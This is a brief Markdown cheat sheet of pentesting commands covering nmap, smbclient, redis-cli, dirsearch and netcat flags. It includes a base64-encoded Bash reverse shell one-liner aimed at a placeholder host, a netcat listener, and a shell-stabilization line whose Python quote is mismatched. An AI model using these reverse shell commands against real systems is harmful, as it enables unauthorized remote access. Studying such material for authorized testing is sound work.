# 💻🔐 Cybersecurity
Recopilation of usefull information for pentesting.  
 
nmap
---
```-sV``` : service version detection  
```-sC``` : scan with default scripts, vulnerability detection, service enumeration, and more...  
```-v``` : verbose mode  
```-p-``` : scan all ports, specifies a range of ports from 1 to 65535  
```-T5``` :  timing template for the scan, attempt to scan as fast as possible  

bash
---
```echo "bash -i >& /dev/tcp/YourIp/YourPort 0>&1" | base64 -w 0``` encoding a Bash reverse shell payload using base64

smbclient
---
```//address/Workspace``` : SMB share location  
```-U Username``` : connect to the SMB with the given username  
```-N``` : no password should be provided for authentication  
#### client session
```ls``` : list files  
```cd DirName``` : change dir  
```get FileName``` : downloads the file  
```put FileName``` : upload the file  
```del FileName``` : deletes the file  
```mkdir DirName``` : create dir  
```rmdir DirName``` : delete dir  
```quit``` : Exit SMB client  

redis-cli
---
```-h HOST``` : host address of the Redis server you want to connect to  

python3 dirsearch
---
```-u TargetURL``` : specify the target URL to scan  

netcat
---
```nc -nvlp PORT``` start a listening service on port  

jd-gui
---
```jd-gui FileName``` opens the file on java decompiler

shell-stabilization
---
```python3 -c "import pty; pty.spawn('/bin/bash)"``` prevents you from killing your reverse shell and adds proper shell functionalities


